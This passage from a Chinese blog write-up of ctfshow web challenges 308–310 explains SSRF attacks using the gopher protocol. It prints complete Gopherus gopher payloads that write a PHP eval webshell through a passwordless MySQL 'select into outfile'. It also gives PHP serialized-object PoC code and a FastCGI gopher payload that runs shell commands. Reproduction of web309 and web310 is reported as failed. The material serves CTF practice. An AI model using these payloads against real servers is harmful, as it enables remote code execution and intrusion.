+<p>Gopher协议的复用：Gopher协议被设计来检索文档、文件等，但其简单的文本基础让它可以被滥用来构造其他协议的请求，包括MySQL的。通过构造特定的Gopher链接，可以使受SSRF漏洞影响的服务器生成并发送几乎任意的网络请求。</p>
+</blockquote>
+<blockquote>
+<p>MySQL协议的特性：在某些配置下，MySQL服务器可能不需要密码即可连接（例如，当MySQL配置为只允许来自localhost的连接，且没有设置密码时）。如果攻击者能够通过SSRF漏洞利用Gopher协议与内部或受限制的MySQL服务器通信，他们可能能够执行未授权的数据库查询或命令。</p>
+</blockquote>
+<blockquote>
+<p>总之，SSRF配合Gopher攻击未加密码保护的MySQL数据库的可能性基于多种因素：旧协议的滥用、内部服务的宽松配置、以及应用程序的安全弱点。</p>
+</blockquote>
+<p>使用Gopherus可以构造这样的Gopher链接。anaconda弄个py2环境就能用Gopherus了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python .\gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line">username: root</span><br><span class="line">query: select &quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/a.php&quot;</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%47%45%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%01%00%00%00%01</span><br></pre></td></tr></table></figure>
+
+<p>根据之前的推理，构造poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVersion</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">checkUpdate</span>(<span class="variable">$this</span>-&gt;config-&gt;update_url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%48%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%47%45%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%22%01%00%00%00%01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>注意：路径和写入的内容都需加双引号，也许是要根据字符串来看。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;/var/www/html/a.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web309-SSRF打FastCGI"><a href="#web309-SSRF打FastCGI" class="headerlink" title="web309 - SSRF打FastCGI"></a>web309 - SSRF打FastCGI</h2><p>提示：需要拿shell，308的方法不行了,mysql 有密码了。</p>
+<p>再次审计内容，<code>index.php</code>中<code>checkVersion()</code>方法最后的返回值居然是显式返回的，可以尝试先curl以下百度的txt。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3&gt;最新版本：&lt;span <span class="class"><span class="keyword">class</span>=&quot;<span class="title">tpl</span>-<span class="title">color</span>-<span class="title">primary</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">lastVersion</span>;?&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">h3</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;###&quot;&gt;全部&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改web308的poc：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVersion</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">checkUpdate</span>(<span class="variable">$this</span>-&gt;config-&gt;update_url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $update_url = &#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%48%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%47%45%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%22%01%00%00%00%01&#x27;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;https://www.baidu.com/robots.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>无事发生。或许这段html是登录后才能显示的。</p>
+<p>查看<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/263601.html">wp</a>，发现是<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/292437.html">SSRF打FastCGI</a>。当服务端是<strong>PHP语言+NGINX</strong>时，就要考虑是否为FastCGI了。</p>
+<blockquote>
+<p>FastCGI是用来提高CGI程序性能的。类似于CGI，FastCGI也可以说是一种协议。简单来说就是CGI的优化：对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p>
+</blockquote>
+<p>gopherus可以打FastCGI。</p>
+<p>尝试用gopherus，但是失败了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give one file name which should be surely present in the server (prefer .php file)</span><br><span class="line">if you don&#x27;t know press ENTER we have default one:  index.php</span><br><span class="line">Terminal command to run:  tac f*</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF:</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27tac%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVersion</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">checkUpdate</span>(<span class="variable">$this</span>-&gt;config-&gt;update_url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH57%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%009%04%00%3C%3Fphp%20system%28%27ls%20-a%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>
+
+<p><strong>复现失败！</strong></p>
+<h2 id="web310-SSRF读配置文件"><a href="#web310-SSRF读配置文件" class="headerlink" title="web310 - SSRF读配置文件"></a>web310 - SSRF读配置文件</h2><p>直接读wp，发现可以使用<code>file://</code>伪协议读配置文件nginx.conf。</p>
+<p><strong>复现失败！</strong>自己尝试构建Payload多次未果，尝试直接使用<a target="_blank" rel="noopener" href="https://juejin.cn/post/7083293190022758407#heading-8">wp1</a>和<a target="_blank" rel="noopener" href="https://www.wanan.red/9e150aa3#ssrf%E8%AF%BB%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">wp2</a>的payload也失败了。</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web301"><span class="toc-number">1.</span> <span class="toc-text">web301</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web302"><span class="toc-number">2.</span> <span class="toc-text">web302</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web303"><span class="toc-number">3.</span> <span class="toc-text">web303</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web304"><span class="toc-number">4.</span> <span class="toc-text">web304</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web305"><span class="toc-number">5.</span> <span class="toc-text">web305</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web306"><span class="toc-number">6.</span> <span class="toc-text">web306</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%96%B9%E6%B3%95%E9%97%AE%E9%A2%98"><span class="toc-number">6.1.</span> <span class="toc-text">PHP序列化的方法问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web307"><span class="toc-number">7.</span> <span class="toc-text">web307</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web308-SSRF%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81MySQL"><span class="toc-number">8.</span> <span class="toc-text">web308 - SSRF打无密码MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web309-SSRF%E6%89%93FastCGI"><span class="toc-number">9.</span> <span class="toc-text">web309 - SSRF打FastCGI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web310-SSRF%E8%AF%BB%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">10.</span> <span class="toc-text">web310 - SSRF读配置文件</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&text=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&is_video=false&description=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-代码审计入门&body=Check out this article: http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&name=ctfshow-web入门笔记-代码审计入门&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&t=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
